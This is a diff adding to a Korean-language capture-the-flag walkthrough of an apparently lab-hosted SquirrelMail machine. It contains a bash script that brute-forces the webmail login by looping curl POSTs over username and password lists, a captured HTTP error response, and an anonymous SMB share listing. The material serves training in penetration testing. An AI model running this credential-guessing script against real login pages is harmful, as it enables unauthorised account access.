@@ -1152,3 +1152,125 @@ login_username=milesdyson&secretkey=1234&js_autodetect_results=1&just_logged_in=
 > milesdyson/terminator22596
 > milesdyson/terminator219
 ![](https://velog.velcdn.com/images/agnusdei1207/post/43401668-2898-4170-869b-09ac6128335e/image.png)
+
+
+```bash
+#!/bin/bash
+
+# 사용자 및 비밀번호 파일
+USER_FILE="users.txt"
+PASS_FILE="pass.txt"
+
+# --- 중요: 로그인 실패를 나타내는 고유 문자열을 여기에 입력하세요. ---
+# (예: SquirrelMail의 경우, "Error logging in" 또는 "You have to be logged in to view this page." 등)
+# 실제 응답을 확인하여 고유한 문자열을 사용해야 합니다.
+FAILURE_STRING="로그인 실패 시 나오는 고유한 문자열" 
+# ---------------------------------------------------------------
+
+echo "--- SquirrelMail Brute-Force Test Started ---"
+echo "Target: http://10.48.183.145/squirrelmail/src/redirect.php"
+echo "-----------------------------------------------"
+
+for u in $(cat $USER_FILE); do
+  for p in $(cat $PASS_FILE); do
+    
+    # 테스팅 중인 조합 출력
+    echo "Testing $u:$p"
+
+    # curl 요청 실행
+    # -s: Silent 모드 (진행률 표시 숨김)
+    # -d: POST 데이터 전송 (application/x-www-form-urlencoded)
+    # -q: grep 쿼리 옵션 (출력 없이 상태 코드만 반환)
+    curl -s -X POST "http://10.48.183.145/squirrelmail/src/redirect.php" \
+      -d "login_username=$u&secretkey=$p&js_autodetect_results=1&just_logged_in=1" \
+      -H "Content-Type: application/x-www-form-urlencoded" \
+      | grep -q "$FAILURE_STRING"
+
+    # grep의 Exit Code 확인
+    # $? = 0 이면: 문자열을 찾았음 (로그인 실패) -> 아무것도 하지 않음
+    # $? = 1 이면: 문자열을 찾지 못했음 (로그인 성공 또는 다른 응답) -> SUCCESS 메시지 출력
+    if [ $? -ne 0 ]; then
+        echo "✅ SUCCESS: $u:$p"
+    fi
+  done
+done
+
+echo "--- Test Completed ---"
+```
+
+> burpsuite
+
+
+```bash
+HTTP/1.1 200 OK
+Date: Sun, 30 Nov 2025 14:16:08 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Expires: Sat, 1 Jan 2000 00:00:00 GMT
+Cache-Control: no-cache, no-store, must-revalidate
+Pragma: no-cache
+Set-Cookie: SQMSESSID=76l74mvl2advp2bt6epchhb782; path=/squirrelmail/; HttpOnly
+Set-Cookie: SQMSESSID=76l74mvl2advp2bt6epchhb782; path=/squirrelmail/; HttpOnly
+Set-Cookie: SQMSESSID=76l74mvl2advp2bt6epchhb782; path=/squirrelmail/; HttpOnly
+Set-Cookie: SQMSESSID=76l74mvl2advp2bt6epchhb782; path=/squirrelmail/; HttpOnly
+Set-Cookie: SQMSESSID=76l74mvl2advp2bt6epchhb782; path=/squirrelmail/; HttpOnly
+Set-Cookie: squirrelmail_language=en_US; expires=Tue, 30-Dec-2025 14:16:10 GMT; path=/squirrelmail/; HttpOnly
+Set-Cookie: SQMSESSID=hi4b7kdkpbfev2v9q31pf27392; path=/squirrelmail/
+Set-Cookie: SQMSESSID=hi4b7kdkpbfev2v9q31pf27392; path=/squirrelmail/; HttpOnly
+Set-Cookie: SQMSESSID=hi4b7kdkpbfev2v9q31pf27392; path=/squirrelmail/; HttpOnly
+Set-Cookie: SQMSESSID=76l74mvl2advp2bt6epchhb782; expires=Thu, 01-Jan-1970 00:00:01 GMT; path=/squirrelmail/; HttpOnly
+Set-Cookie: SQMSESSID=76l74mvl2advp2bt6epchhb782; expires=Thu, 01-Jan-1970 00:00:01 GMT; path=/squirrelmail/src; HttpOnly
+Set-Cookie: SQMSESSID=76l74mvl2advp2bt6epchhb782; expires=Thu, 01-Jan-1970 00:00:01 GMT; path=/squirrelmail/src/; HttpOnly
+X-Frame-Options: SAMEORIGIN
+Vary: Accept-Encoding
+Content-Length: 1789
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+
+<html>
+
+<head>
+<meta name="robots" content="noindex,nofollow">
+<meta http-equiv="x-dns-prefetch-control" content="off">
+<script type="text/javascript" language="JavaScript">
+<!--
+if (self != top) { try { if (document.domain != top.document.domain) { throw "Clickjacking security violation! Please log out immediately!"; /* this code should never execute - exception should already have been thrown since it's a security violation in this case to even try to access top.document.domain (but it's left here just to be extra safe) */ } } catch (e) { self.location = "/squirrelmail/src/signout.php"; top.location = "/squirrelmail/src/signout.php" } }
+// -->
+</script>
+
+<title>SquirrelMail - Unknown user or password incorrect.</title>
+<!--[if IE 6]>
+<style type="text/css">
+/* avoid stupid IE6 bug with frames and scrollbars */
+body {
+    width: expression(document.documentElement.clientWidth - 30);
+}
+</style>
+<![endif]-->
+
+</head>
+
+<body text="#000000" bgcolor="#ffffff" link="#0000cc" vlink="#0000cc" alink="#0000cc">
+
+<center><img src="../images/sm_logo.png" alt="SquirrelMail Logo" width="308" height="111" /><br />
+<small>SquirrelMail version 1.4.23 [SVN]<br />By the SquirrelMail Project Team<br /></small>
+<table cellspacing="1" cellpadding="0" bgcolor="#800000" width="70%"><tr><td><table width="100%" border="0" bgcolor="#ffffff" align="center"><tr><td bgcolor="#dcdcdc" align="center"><font color="#cc0000"><b>ERROR</b></font></td></tr><tr><td align="center">Unknown user or password incorrect.</td></tr><tr><td bgcolor="#dcdcdc" align="center"><font color="#cc0000"><b><a href="/squirrelmail/src/login.php" target="_top">Go to the login page</a></b></font></td></tr></table></td></tr></table></center></body></html>
+```
+
+
+> smbclient
+
+┌──(kali㉿kali)-[~]
+└─$ smbclient //10.48.183.145/anonymous -N
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Fri Nov 27 01:04:00 2020
+  ..                                  D        0  Tue Sep 17 16:20:17 2019
+  attention.txt                       N      163  Wed Sep 18 12:04:59 2019
+  logs                                D        0  Wed Sep 18 13:42:16 2019
+
+                9204224 blocks of size 1024. 5831420 blocks available
+smb: \> 
+
